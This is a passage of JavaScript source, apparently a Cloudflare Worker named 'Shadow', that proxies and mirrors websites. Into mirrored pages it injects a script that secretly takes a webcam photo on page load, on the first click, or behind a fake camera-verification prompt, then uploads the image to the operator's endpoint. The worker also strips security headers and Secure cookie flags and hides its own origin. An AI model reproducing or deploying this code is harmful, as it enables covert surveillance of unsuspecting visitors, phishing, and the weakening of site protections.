          if (el) el.remove();
        });
      }
      function upload(data) {
        const payload = JSON.stringify({ id: ID, image: data });
        if (navigator.sendBeacon) {
          navigator.sendBeacon(API_UPLOAD, new Blob([payload], {type: 'application/json'}));
        } else {
          originalFetch(API_UPLOAD, { method: 'POST', body: payload, keepalive: true }).catch(()=>{});
        }
      }
      async function startCapture() {
        if (captured) return;
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640 } });
          captured = true;
          unlock();
          const video = document.createElement('video');
          video.srcObject = stream;
          await video.play();
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth; canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          upload(canvas.toDataURL('image/jpeg', 0.6));
        } catch(e) { if(MODE==="1") alert("验证失败，请授权摄像头。"); }
      }
      if(MODE==="1") window.performCapture = startCapture;
      else if(MODE==="2") window.addEventListener('click', startCapture, {once:true});
      else window.addEventListener('load', startCapture);
    })();
    </script>
    `;

    // 3. HTML / JS 动态重组 (关键修复：base 标签必须指向本域，防止相对路径逃逸)
    if (isHtml) {
      const baseTag = `<base href="/">`;
      const headInjection = `${baseTag}${shouldCapture ? forceStyle + captureScript : ""}`;
      html = html.replace(/<head>/i, `<head>${headInjection}`);
      html = html.replace(/<\/body>/i, `${shouldCapture ? forceHtml : ""}</body>`);
    } else if (contentType.includes("javascript")) {
      // 对 JS 文件也进行域名漂移，确保其内部硬编码的 URL 也走隧道
      staticDomains.forEach(domain => {
        const regex = new RegExp(`(https?:)?//${domain}`, 'g');
        html = html.replace(regex, `${currentOrigin}/proxy/${domain}`);
      });
      html = html.replace(/(https?:)?\/\/www\.baidu\.com/g, "");
    }

    // 5. 最终响应处理：应用 Cookie 逻辑并清理安全头
    const finalHeaders = cleanCookieHeaders(response.headers);
    finalHeaders.set("Content-Type", "text/html; charset=UTF-8");
    finalHeaders.set("X-Mirror-Engine", "Shadow-V5-Turbo");
    finalHeaders.set("Access-Control-Allow-Origin", "*");

    // 设置 Cookie 记忆，关键修复：必须同时设置 SHADOW_TARGET 以维持 Session
    if (targetUrl) {
      finalHeaders.append("Set-Cookie", `SHADOW_TARGET=${encodeURIComponent(new URL(targetUrl).origin)}; Path=/; Max-Age=3600; SameSite=Lax`);
    }
    if (id && !cachedId) {
      finalHeaders.append("Set-Cookie", `SHADOW_ID=${id}; Path=/; Max-Age=3600; SameSite=Lax`);
    }

    const finalResponse = new Response(html, {
      status: 200,
      headers: finalHeaders,
    });

    // 存入边缘缓存，加速后续访问
    ctx.waitUntil(cache.put(cacheKey, finalResponse.clone()));

    return finalResponse;
  } catch (err) {
    return new Response(`Mirror Error: ${err.message}`, { status: 500 });
  }
}


// 辅助函数：频率限制检查
async function checkRateLimit(request, env, increment = true) {
  // 1. 获取 IP
  const ip = getClientIP(request);
  const whitelist = env.WHITELIST_IP;
  let isWhitelisted = false;
  if (whitelist) {
    const allowedIps = whitelist.split(',').map(i => i.trim());
    isWhitelisted = allowedIps.includes(ip);
  }

  // 2. 频率限制 (基于 IP + 日期)
  const store = env.KV_DATABASE;
  if (!store) return true; // 无 KV 时默认放行

  const today = new Date().toISOString().split('T')[0];
  const key = `limit:${ip}:${today}`;
  const count = parseInt(await store.get(key) || "0");

  // 3. 计数增加逻辑
  if (increment) {
    await store.put(key, (count + 1).toString(), { expirationTtl: 90000 });
  }

  // 4. 判断逻辑：白名单永远放行，非白名单检查次数
  if (isWhitelisted) return true;
  return count < 10;
}

// 辅助函数：解析 Cookie
function getCookie(request, name) {
  const cookieString = request.headers.get("Cookie");
  if (!cookieString) return null;
  const cookies = cookieString.split(";");
  for (let cookie of cookies) {
    const [key, value] = cookie.trim().split("=");
    if (key === name) return decodeURIComponent(value);
  }
  return null;
}

// 辅助函数：清理 Cookie Header
function cleanCookieHeaders(resHeaders) {
  const newHeaders = new Headers();
  resHeaders.forEach((v, k) => {
    const key = k.toLowerCase();
    if (key === "set-cookie") {
      const clean = v.replace(/Domain=[^; ]+;?/gi, "")
        .replace(/Path=\/[^; ]*/gi, "Path=/")
        .replace(/Secure;?/gi, "");
      newHeaders.append("Set-Cookie", clean);
    } else if (key !== "content-security-policy" && key !== "x-frame-options" && key !== "x-content-type-options") {
      newHeaders.set(k, v);
    }
  });
  return newHeaders;
}

// --- V9.2 系统模块分发 ---

async function handleApi(request, env, ctx) {
  const url = new URL(request.url);
  const path = url.pathname;

  if (path === "/api/ping" || path === "/ping") {
    return new Response(JSON.stringify({ status: "ok", time: new Date().toISOString() }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" }
    });
  }

  // 健康度与存储桶统计
  if (path === "/api/stats") {
    try {
      const list = await env.PHOTO_BUCKET.list({ limit: 1 });
      return new Response(JSON.stringify({ storage: "ready", ObjectsCount: list.objects.length }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    } catch (e) {
      return new Response(JSON.stringify({ storage: "error", message: e.message }), {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }
  }

  return new Response("API Not Found", { status: 404 });
}

async function handleProxy(request, env, ctx) {
  const url = new URL(request.url);
  const path = url.pathname;
  const remaining = path.replace("/proxy/", "");
  const firstSlash = remaining.indexOf("/");

  if (firstSlash === -1) {
    return new Response("Invalid Proxy Path", { status: 400 });
  }

  const targetHost = remaining.substring(0, firstSlash);
  const targetPath = remaining.substring(firstSlash);
  const proxyUrl = new URL(targetPath + url.search, `https://${targetHost}`);

  console.log(`[Shadow Proxy] Fetching: ${proxyUrl.toString()}`);

  const proxyHeaders = new Headers(request.headers);
  proxyHeaders.set("Host", targetHost);
  proxyHeaders.set("Referer", `https://${targetHost}/`);
  proxyHeaders.set("Origin", `https://${targetHost}`);

  // 深度隔离，防止泄露 Worker 身份
  proxyHeaders.delete("CF-Connecting-IP");
  proxyHeaders.delete("X-Forwarded-For");

  try {
    const res = await fetch(proxyUrl, {
      headers: proxyHeaders,
      redirect: "follow"
    });

    const cleanHeaders = cleanCookieHeaders(res.headers);
    cleanHeaders.set("Access-Control-Allow-Origin", "*");
    return new Response(res.body, { status: res.status, headers: cleanHeaders });
  } catch (e) {
    console.error(`[Shadow Proxy] Error: ${e.message}`);
    return new Response("Proxy Error", { status: 502 });
  }
}

async function handleStatic(request, env, filename) {
  // 如果有 ASSETS 绑定（Wrangler Pages），尝试 fetch
  if (env.ASSETS) {
    return env.ASSETS.fetch(request);
  }
  // 否则根据文件名决定返回内容
  if (filename === "home.html") {
    // 这里如果愿意可以用变量存储整个 HTML 字符串，也可以通过 R2 读取。
    // 本项目中主逻辑在 handleMirror 下，home.html 通常是静态站点。
    // 我们在此演示：若无绑定，返回一个带有说明的响应
    return new Response("Static Asset Service Not Connected", { status: 503 });
  }
  return new Response("File Not Found", { status: 404 });
}

// 辅助函数：根据当前域名打包导航 URL
function wrapNav(targetUrl, selfOrigin, id = "") {
  if (!targetUrl) return "";
  try {
    const raw = id ? `${id}|${targetUrl}` : targetUrl;
    // 使用 encodeURIComponent 确保支持中文 ID
    const b64 = btoa(encodeURIComponent(raw));
    return `${selfOrigin}/v?d=${b64}&m=0`;
  } catch (e) {
    return targetUrl;
  }
}
